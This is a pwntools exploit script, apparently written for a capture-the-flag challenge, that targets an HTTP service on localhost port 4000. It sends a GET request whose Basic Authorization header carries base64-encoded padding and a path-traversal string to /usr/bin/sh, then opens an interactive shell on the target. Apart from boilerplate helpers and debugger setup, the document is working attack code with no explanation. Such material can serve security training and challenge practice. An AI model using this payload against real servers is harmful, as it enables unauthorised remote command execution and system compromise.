from pwn import *
import sys
remote_addr = ["127.0.0.1", 4000]
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("")
    context(arch='', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

payload = b'GET / HTTP/1.0\r\n'
msg = b'a' * 0x40 + b"/../../../../../../../../../usr/bin/sh?aaa.js"
payload += b'Authorization: Basic ' + base64.b64encode(msg) + b'\r\n\r\n'
s(payload)


shell()
